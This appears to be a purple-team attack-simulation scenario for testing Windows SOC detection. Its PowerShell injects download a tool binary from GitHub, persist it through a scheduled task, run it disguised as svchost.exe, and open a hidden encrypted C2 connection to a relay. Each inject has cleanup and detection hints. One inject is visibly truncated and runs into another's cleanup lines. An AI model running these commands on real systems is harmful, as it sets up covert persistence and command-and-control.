scenario_information.scenario_description: Purple-team BAS that exercises the real wetland tool (wld.exe) in six ways so the SOC can validate detection of the tool itself on Windows: it is downloaded from the v0.1.0 Release and run (T1105), run under a fake svchost.exe name (T1036), persisted via a scheduled task and an HKCU Run key (T1053.005 / T1547.001), and finally opens wld's encrypted NAT-traversal C2 channel to the relay, plain and under a svchost name (T1572/T1573). Every inject uses the real wld.exe, is tagged WETLAND-LAB and self-cleans. (wld's `lab` sub-techniques are POSIX-only, so on Windows the tool is exercised as the core client.) Edit the Relay/Secret lines to your lab relay. Target your Windows assets.

injector_contract_payload.payload_description: Downloads wld.exe to %LOCALAPPDATA% and creates an ONLOGON scheduled task (WETLAND-LAB) that runs it. SOC should flag a new task whose action is the wld binary. Cleanup deletes the task + binary.
injector_contract_payload.payload_cleanup_command:
schtasks /Delete /TN WETLAND-LAB /F | Out-Null
Remove-Item (Join-Path $env:LOCALAPPDATA 'wld.exe') -Force -ErrorAction SilentlyContinue
Write-Output 'WETLAND-LAB persist[schtask]: cleaned'
injector_contract_payload.command_content:
# WETLAND-LAB  T1053.005 — persist the wld tool via a scheduled task
$url = 'https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-windows-x86_64.exe'
$dst = (Join-Path $env:LOCALAPPDATA 'wld.exe')
if (-not (Test-Path $dst)) { try { curl.exe -fsSL -o $dst $url } catch {} }
if (-not (Test-Path $dst)) { Write-Output 'WETLAND-LAB: wld.exe download blocked (proxy/AV) — valid detection'; return }
schtasks /Create /TN WETLAND-LAB /TR "`"$dst`" -h" /SC ONLOGON /F | Out-Null
Write-Output "WETLAND-LAB persist[schtask]: ONLOGON task WETLAND-LAB runs $dst (T1053.005)"
Write-Output 'detect: schtasks /Query /TN WETLAND-LAB ; TaskScheduler 4698 ; task action = wld.exe'

injector_contract_payload.command_content:
# WETLAND-LAB  T1547.001 — persist the wld tool via an HKCU Run key
$url = 'https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-windows-x86_64.exe'

Remove-Item (Join-Path $env:TEMP 'wld.exe') -Force -ErrorAction SilentlyContinue
Write-Output 'WETLAND-LAB c2: cleaned'
injector_contract_payload.command_content:
$RelayHost = 'relay.lab.local'       # <-- EDIT: your wetland relay host
$RelayPort = '7440'                  # <-- EDIT: relay port
$Secret    = 'WETLAND-LAB-demo-secret' # <-- EDIT: shared secret (match the listener)
# WETLAND-LAB  T1572 / T1573 / T1071 — wld encrypted C2 channel (connector)
$url = 'https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-windows-x86_64.exe'
$dst = (Join-Path $env:TEMP 'wld.exe')
if (-not (Test-Path $dst)) { try { curl.exe -fsSL -o $dst $url } catch {} }
if (-not (Test-Path $dst)) { Write-Output 'WETLAND-LAB: wld.exe download blocked (proxy/AV) — valid detection'; return }
Write-Output "WETLAND-LAB c2: wld.exe connecting to ${RelayHost}:${RelayPort} (up to 20s)..."
$p = Start-Process -FilePath $dst -ArgumentList '-s',$Secret,'-H',$RelayHost,'-p',$RelayPort -PassThru -WindowStyle Hidden
Start-Sleep -Seconds 20
$p | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Output 'WETLAND-LAB c2: wld.exe stopped — generated outbound rendezvous/handshake telemetry'
Write-Output 'detect: wld.exe process + outbound TCP to the relay; custom E2E handshake; rare destination'

injector_contract_payload.payload_description: Runs the wld channel under a svchost.exe name: copies wld.exe to svchost.exe and connects to the relay for ~20s. SOC should flag a fake svchost.exe making outbound encrypted connections.
injector_contract_payload.payload_cleanup_command:
Get-Process svchost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq (Join-Path $env:TEMP 'svchost.exe') } | Stop-Process -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:TEMP 'svchost.exe'),(Join-Path $env:TEMP 'wld.exe') -Force -ErrorAction SilentlyContinue
Write-Output 'WETLAND-LAB c2-masq: cleaned'
injector_contract_payload.command_content:
$RelayHost = 'relay.lab.local'       # <-- EDIT: your wetland relay host
$RelayPort = '7440'                  # <-- EDIT: relay port
$Secret    = 'WETLAND-LAB-demo-secret' # <-- EDIT: shared secret (match the listener)
# WETLAND-LAB  T1036 + T1572 — wld C2 channel under a fake svchost name
$url = 'https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-windows-x86_64.exe'
$dst = (Join-Path $env:TEMP 'wld.exe')
if (-not (Test-Path $dst)) { try { curl.exe -fsSL -o $dst $url } catch {} }
if (-not (Test-Path $dst)) { Write-Output 'WETLAND-LAB: wld.exe download blocked (proxy/AV) — valid detection'; return }
$fake = (Join-Path $env:TEMP 'svchost.exe')
Copy-Item $dst $fake -Force
Write-Output "WETLAND-LAB c2-masq: svchost(wld) connecting to ${RelayHost}:${RelayPort} (up to 20s)..."
$p = Start-Process -FilePath $fake -ArgumentList '-s',$Secret,'-H',$RelayHost,'-p',$RelayPort -PassThru -WindowStyle Hidden
Start-Sleep -Seconds 20
$p | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Output 'WETLAND-LAB c2-masq: stopped — fake svchost made outbound encrypted connections'
Write-Output 'detect: svchost.exe outside System32 making outbound sessions; hash matches wld'
